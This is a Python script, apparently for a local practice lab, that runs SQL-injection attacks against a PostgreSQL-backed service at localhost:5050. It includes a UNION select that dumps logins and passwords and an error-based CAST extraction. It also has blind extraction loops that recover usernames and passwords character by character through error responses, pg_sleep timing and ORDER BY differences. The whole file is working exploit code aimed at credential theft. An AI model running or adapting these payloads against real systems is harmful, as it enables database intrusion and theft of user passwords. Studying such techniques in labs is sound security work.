import requests
import string
import time
url = "http://localhost:5050"

def simple_injection(path, payload):
    data = {
        "id": payload
    }
    res = requests.post(url+path, json=data)
    return res.json()

def error_conditional():
    username = ''
    password = ''
    while True:
        for sym in string.ascii_lowercase:
            data = {
                "id": f"(SELECT CASE WHEN (login like '{username+sym}%%') THEN 1/(SELECT 0) ELSE 1 END from users limit 1)"
            }
            res = requests.post(url+'/error_conditional', json=data)
            if res.status_code == 500:
                username += sym
                break
        else:
            print(username)
            break
    while True:
        for sym in string.ascii_lowercase:
            data = {
                "id": f"(SELECT CASE WHEN (password like '{password+sym}%%') THEN 1/(SELECT 0) ELSE 1 END from users limit 1)"
            }
            res = requests.post(url+'/error_conditional', json=data)
            if res.status_code == 500:
                password += sym
                break
        else:
            print(password)
            break

def time_based():
    username = ''
    password = ''
    while True:
        for sym in string.ascii_lowercase:
            data = {
                "id": f"(SELECT CASE WHEN (login like '{username+sym}%%') then (select 1 from pg_sleep(1)) ELSE 1 END from users limit 1)"
            }
            start = time.time()
            res = requests.post(url+'/time_based', json=data)
            if time.time()-start > 1:
                username += sym
                break
        else:
            print(username)
            break
    while True:
        for sym in string.ascii_lowercase:
            data = {
                "id": f"(SELECT CASE WHEN (password like '{password+sym}%%') then (select 1 from pg_sleep(1)) ELSE 1 END from users limit 1)"
            }
            start = time.time()
            res = requests.post(url+'/time_based', json=data)
            if time.time()-start > 1:
                password += sym
                break
        else:
            print(password)
            break

def order_by_column():
    username = ''
    password = ''
    while True:
        for sym in string.ascii_lowercase:
            data = {
                "order": f"(case when (select count(*) from users where login like '{username+sym}%%' limit 1)=1 then description else id::text end)"
            }
            res = requests.post(url+'/order_by_column', json=data)
            if res.json()[0]["id"] == 2:
                username += sym
                break
        else:
            print(username)
            break
    while True:
        for sym in string.ascii_lowercase:
            data = {
                "order": f"(case when (select count(*) from users where password like '{password+sym}%%' limit 1)=1 then description else id::text end)"
            }
            res = requests.post(url+'/order_by_column', json=data)
            if res.json()[0]["id"] == 2:
                password += sym
                break
        else:
            print(password)
            break

def order_by():
    username = ''
    password = ''
    while True:
        for sym in string.ascii_lowercase:
            data = {
                "order": f"* (SELECT CASE WHEN (login like '{username+sym}%%') then -1 ELSE 1 END from users limit 1)"
            }
            res = requests.post(url+'/order_by', json=data)
            if res.json()[0]["id"] == 2:
                username += sym
                break
        else:
            print(username)
            break
    while True:
        for sym in string.ascii_lowercase:
            data = {
                "order": f"* (SELECT CASE WHEN (password like '{password+sym}%%') then -1 ELSE 1 END from users limit 1)"
            }
            res = requests.post(url+'/order_by', json=data)
            if res.json()[0]["id"] == 2:
                password += sym
                break
        else:
            print(password)
            break

print('basic')
print(simple_injection('/basic', "3 union select null,login,password from users -- -"))
print('_______________________', end="\n\n")
print('error_visible')
print(simple_injection('/error_visible',"(SELECT CAST((SELECT login || ' ' || password FROM users LIMIT 1) AS int))"))
print('_______________________', end="\n\n")
print('error_conditional')
error_conditional()
print('_______________________', end="\n\n")
print('time_based')
time_based()
print('_______________________', end="\n\n")
print('order_by')
order_by()
print('_______________________', end="\n\n")
print('order_by_column')
order_by_column()
print('_______________________', end="\n\n")